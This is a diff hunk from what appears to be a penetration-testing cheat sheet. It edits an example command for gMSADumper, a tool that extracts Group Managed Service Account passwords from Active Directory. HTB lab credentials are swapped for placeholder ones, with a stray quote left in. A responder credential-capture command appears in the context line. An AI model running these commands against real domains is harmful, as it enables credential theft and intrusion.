@@ -1950,7 +1950,7 @@ $ sudo responder -I tun0 -rdwv
 $ https://github.com/micahvandeusen/gMSADumper
 
 => Commands
-$ python3 gMSADumper.py -u 'Ted.Graves' -p 'Mr.Teddy' -d intelligence.htb
+$ python3 gMSADumper.py -u 'nik' -p 'Passw0rd@123!'' -d bank.local
 
 => References
 $ https://docs.microsoft.com/en-us/windows/win32/adschema/a-msds-managedpasswordid
